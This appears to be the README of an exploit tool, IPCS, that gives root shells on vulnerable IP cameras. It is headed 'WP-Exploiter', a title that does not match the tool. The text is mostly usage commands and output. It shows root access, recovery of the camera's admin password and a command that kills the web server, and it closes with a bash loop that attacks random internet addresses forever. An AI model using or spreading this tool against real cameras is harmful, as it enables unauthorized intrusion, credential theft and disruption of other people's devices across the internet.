# WP-Exploiter


IPCS is a command line script for testing and exploiting a wide range of IP cameras as demonstrated by Craig Heffner in "Exploiting Surveillance Cameras Like a Hollywood Hacker". See the slides here: https://media.blackhat.com/us-13/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-WP.pdf

A copy of the slides is included in the repository.

Requirements
PHP 5
A distribution of Linux. I haven't and won't test this on Windows.
Usage
Basic Usage
Using IPCS is pretty straight forward. You pass the URL to ipcs.php via the -u option.

$ php ipcs.php -u http://192.168.0.3:8080
If the camera is vulnerable you'll be dropped in to a "shell" as root and be able to exploit the camera further.

$ php ipcs.php -u http://192.168.0.3:8080

It's very much like being logged in to a stripped down Unix server as root.

ipcamshell> whoami
root
ipcamshell> id
uid=0(root) gid=0(root)
ipcamshell> ls /
bin
dev
etc
lib
linuxrc
mnt
opt
proc
sbin
scripts
tmp
usr
var
ipcamshell> cat /etc/passwd
root:x:0:0:Linux User,,,:/:/bin/sh
Use quit, exit, or ^C to exit.

Further Attacks
Of course it wouldn't be very fun without the ability to login and view the camera...

ipcamshell> getadminpass
Username: admin
Password: hunter2
If you wish to kill the web server (to prevent someone from accessing the web interface temporarily), run the killswitch command. Note that the camera will continue to record regardless of this.

If the camera isn't vulnerable, the server isn't up, or the internet hates you, you'll recieve the following message:

Sorry, the server specified isn't vulnerable.
Automation
IPCS has the potential to be automated in different ways. This, I'm going to leave to you. The -c option won't drop you in to a shell after successfully exploiting a server, and the -g option surpresses the "Sorry, the server specified isn't vulnerable." messages for failed attempts.

As an example, the following bash script will forever try to attack randomly generated IPv4 addresses.

#!/bin/bash
while true; do export ip=$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)) && echo "Trying $ip..." && php ipcs.php -c 1 -g 1 -u http://$ip; done;
This is slow, and will likely yield nothing without extremely good luck. Use your imagination. :)
